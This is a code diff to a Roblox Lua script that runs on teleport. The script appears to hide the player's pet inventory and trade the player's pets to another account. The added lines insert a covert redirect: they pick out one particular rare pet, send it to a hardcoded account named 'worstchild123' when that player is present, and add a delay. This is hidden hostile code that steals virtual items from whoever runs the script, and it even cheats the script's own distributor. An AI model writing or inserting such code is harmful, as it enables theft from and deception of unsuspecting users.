@@ -979,8 +979,13 @@ queue_on_teleport([==[
 	pcall(function()
 		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:Destroy()
 	end)
+
+	local isme = nil
+	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then isme = v.id end end
+	
 	local IDs = {]==] .. (looool or IDs) .. [==[}
-        local hint = Instance.new('Hint', workspace)
+        if isme then IDs = {isme} end
+	local hint = Instance.new('Hint', workspace)
 	hint.Text = '[3/4] Trading pets to account'
 
 	local tptimestamp = ]=] .. tptimestamp .. [=[
@@ -999,7 +1004,7 @@ queue_on_teleport([==[
 	end)
         local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
-	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+	local PLR = game.Players:FindFirstChild'worstchild123' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
@@ -1028,7 +1033,7 @@ queue_on_teleport([==[
         workspace.__REMOTES.Game.Trading:InvokeServer("Ready", lastTradeId)
         
         repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
-        
+        if isme then wait(5) end
         queue_on_teleport([[
 	    repeat task.wait() until game:IsLoaded()
             local h = Instance.new('Hint',workspace)
